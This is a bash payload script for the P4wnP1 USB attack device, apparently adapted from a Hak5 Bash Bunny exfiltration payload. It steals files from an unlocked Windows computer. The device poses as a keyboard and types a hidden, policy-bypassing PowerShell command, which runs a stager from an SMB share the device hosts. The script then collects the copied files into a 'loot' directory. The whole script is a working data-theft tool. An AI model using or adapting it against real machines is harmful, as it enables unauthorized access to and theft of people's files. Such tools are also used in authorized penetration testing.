#!/bin/bash

# Exfiltrate files from an unlocked windows machine using SMB
# Based on: https://github.com/hak5/bashbunny-payloads/tree/master/payloads/library/exfiltration/smb_exfiltrator 
# You need to setup P4wnP1 USB Gadget Settings as RNDIS_ETHERNET and HID keyboard
# Requirements 
# impacket: sudo apt-get install python-impacket or download and install from https://github.com/SecureAuthCorp/impacket
# smbserver.py from the impacket examples folder should be located in: "/usr/local/bin/smbserver.py" (should already be there in kali linux)
# Copy this script to "/usr/local/P4wnP1/scripts/"
# Copy the "smb_exfiltrator" directory to "/usr/local/P4wnP1/scripts/"
# Create a trigger to start the bash script "smb_exfiltrator.sh" when DHCP lease issued.


LOOTDIR=/usr/local/P4wnP1/www/loot/smb_exfiltrator
TARGET_HOSTNAME=$(cat /tmp/dnsmasq_usbeth.leases | cut -d " " -f4);
TARGET_IP=$(cat /tmp/dnsmasq_usbeth.leases | cut -d " " -f3);
HOST_IP=$(ifconfig usbeth | awk '$1=="inet"{print $2}');


# Remove temporary loot directory if exist
rm -rf /loot

# Make temporary loot directory
mkdir -p /loot/smb_exfiltrator

# Copy new powershell payload to smb share
cp /usr/local/P4wnP1/scripts/smb_exfiltrator/s.ps1 /loot/smb_exfiltrator/

# Make permanent loot directory
mkdir -p $LOOTDIR
HOST=$TARGET_HOSTNAME
[[ -z "$HOST" ]] && HOST="noname"
COUNT=$(ls -lad $LOOTDIR/$HOST* | wc -l)
COUNT=$((COUNT+1))
mkdir -p $LOOTDIR/$HOST-$COUNT
mkdir -p /usr/local/P4wnP1/www/loot/smb_exfiltrator/$HOST-$COUNT

# Start the SMB Server
python /usr/local/bin/smbserver.py s /loot/smb_exfiltrator -smb2support &

# Re-enable ICMP/echo replies to trip the powershell stager
echo "0" > /proc/sys/net/ipv4/icmp_echo_ignore_all

sleep 5

# Runs hidden powershell which executes \\172.16.0.1\s\s.ps1 when available
P4wnP1_cli hid run -c 'layout("us");press("GUI r");delay(500);type("powershell -windowstyle hidden -Exec Bypass While ($true) { If ((New-Object net.sockets.tcpclient (172.16.0.1,445)).Connected) { \\\\172.16.0.1\\s\\s.ps1; exit } }");press("ENTER")'>/dev/null

# Wait until files are done copying.
while ! [ -f /loot/smb_exfiltrator/EXFILTRATION_COMPLETE ]; do sleep 1; done

######## CLEANUP ########

# Delete EXFILTRATION_COMPLETE file
rm -rf /loot/smb_exfiltrator/EXFILTRATION_COMPLETE

# Move files to permanent loot directory
cp -R /loot/smb_exfiltrator/e/* /usr/local/P4wnP1/www/loot/smb_exfiltrator/$HOST-$COUNT
cp -R /loot/smb_exfiltrator/e/* $LOOTDIR/$HOST-$COUNT

# Clean up temporary loot directory
rm -rf /loot

killall /usr/bin/python2
killall /usr/bin/python2
killall /usr/bin/python2
P4wnP1_cli hid run -c 'press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);' >/dev/null
######## FINISH ########
